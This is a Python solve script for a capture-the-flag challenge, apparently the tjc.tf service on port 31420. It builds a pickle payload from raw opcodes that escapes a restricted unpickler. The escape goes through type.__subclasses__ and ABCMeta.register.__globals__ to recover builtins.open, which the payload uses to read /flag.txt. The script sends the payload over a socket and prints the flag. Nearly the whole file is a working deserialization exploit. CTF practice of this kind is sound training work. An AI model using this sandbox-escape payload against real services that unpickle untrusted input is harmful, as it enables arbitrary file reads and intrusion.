#!/usr/bin/env python3
import ast
import base64
import re
import socket
import struct
import sys


HOST = "tjc.tf"
PORT = 31420


class Global:
    def __init__(self, name):
        self.name = name


class Call:
    def __init__(self, func, *args):
        self.func = func
        self.args = args


def emit_str(value):
    data = value.encode()
    if len(data) < 256:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + struct.pack("<I", len(data)) + data


def emit_int(value):
    if 0 <= value < 256:
        return b"K" + bytes([value])
    return b"J" + struct.pack("<i", value)


def emit_tuple(items):
    data = b"".join(compile_expr(item) for item in items)
    size = len(items)
    if size == 0:
        return b")"
    if size == 1:
        return data + b"\x85"
    if size == 2:
        return data + b"\x86"
    if size == 3:
        return data + b"\x87"
    return b"(" + data + b"t"


def compile_expr(expr):
    if isinstance(expr, Global):
        return emit_str("builtins") + emit_str(expr.name) + b"\x93"
    if isinstance(expr, Call):
        return compile_expr(expr.func) + emit_tuple(expr.args) + b"R"
    if isinstance(expr, str):
        return emit_str(expr)
    if isinstance(expr, int):
        return emit_int(expr)
    raise TypeError(f"unsupported expression: {expr!r}")


def dumps(expr):
    return b"\x80\x04" + compile_expr(expr) + b"."


def attr(obj, name):
    return Call(Global("getattr"), obj, name)


def item(obj, key):
    return Call(attr(obj, "__getitem__"), key)


def build_payload():
    type_subclasses = Call(attr(Global("type"), "__subclasses__"), Global("type"))
    abc_meta = item(type_subclasses, 0)
    register = attr(abc_meta, "register")
    globals_dict = attr(register, "__globals__")
    builtins_dict = item(globals_dict, "__builtins__")
    open_fn = item(builtins_dict, "open")
    flag_file = Call(open_fn, "/flag.txt")
    flag_text = Call(attr(flag_file, "read"))
    flag_chars = Call(Global("list"), flag_text)
    return base64.b64encode(dumps(flag_chars)) + b"\n"


def recv_all(sock):
    chunks = []
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        chunks.append(chunk)
    return b"".join(chunks)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    payload = build_payload()

    with socket.create_connection((host, port)) as sock:
        sock.recv(4096)
        sock.sendall(payload)
        response = recv_all(sock).decode("latin1")

    match = re.search(r"Result: (.*)\n?", response, re.S)
    if not match:
        raise RuntimeError(f"unexpected response: {response!r}")

    chars = ast.literal_eval(match.group(1).strip())
    flag = "".join(chars).strip()
    print(flag)


if __name__ == "__main__":
    main()
